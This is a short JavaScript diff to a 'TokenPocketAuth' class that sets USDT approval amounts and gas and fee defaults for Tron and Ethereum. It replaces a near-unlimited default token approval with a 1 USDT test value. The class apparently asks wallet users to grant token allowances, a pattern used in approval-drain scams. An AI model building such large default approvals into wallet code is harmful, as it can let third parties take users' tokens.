@@ -6,16 +6,19 @@ class TokenPocketAuth {
 	constructor(config = {}) {
 		// 默认配置
 		this.config = {
-			// Tron网络USDT合约地址
+			// 波场网络USDT合约地址
 			tronUsdtContract: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
 			// 以太坊网络USDT合约地址
 			ethUsdtContract: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
-			// 默认授权数量
-			defaultApproveAmount: '7237005577332262000000000',
-			// 默认gas设置
-			defaultGas: '0x15F90', // 90000
-			defaultGasPrice: '0x9184e72a000', // 10 gwei
-			defaultFeeLimit: 100000000,
+			// 默认授权数量 - 测试用小数量 (1 USDT = 1000000 for 6 decimals)
+			defaultApproveAmount: '1000000',
+			// 默认gas设置 - 降低默认值
+			defaultGas: '0x11170', // 70000 (降低了)
+			defaultGasPrice: '0x3B9ACA00', // 1 gwei (大幅降低)
+			// 最大 Gas Price 限制
+			maxGasPrice: '0x4A817C800', // 20 gwei
+			// Tron fee limit - 测试用较小费用 (10 TRX)
+			defaultFeeLimit: 1000000,
 			...config
 		};
 	}
@@ -335,10 +338,22 @@ class TokenPocketAuth {
 	 * 更新配置信息
 	 * @param {Object} newConfig - 新的配置对象
 	 */
-	updateConfig(newConfig) {
+	updateConfig(config = {}) {
 		this.config = {
-			...this.config,
-			...newConfig
+			// 波场网络USDT合约地址
+			tronUsdtContract: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
+			// 以太坊网络USDT合约地址
+			ethUsdtContract: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
+			// 默认授权数量 - 测试用小数量 (1 USDT = 1000000 for 6 decimals)
+			defaultApproveAmount: '1000000',
+			// 默认gas设置 - 降低默认值
+			defaultGas: '0x11170', // 70000 (降低了)
+			defaultGasPrice: '0x3B9ACA00', // 1 gwei (大幅降低)
+			// 最大 Gas Price 限制
+			maxGasPrice: '0x4A817C800', // 20 gwei
+			// Tron fee limit - 测试用较小费用 (10 TRX)
+			defaultFeeLimit: 1000000,
+			...config
 		};
 		console.log('TokenPocketAuth配置已更新:', {
 			tronUsdtContract: this.config.tronUsdtContract,
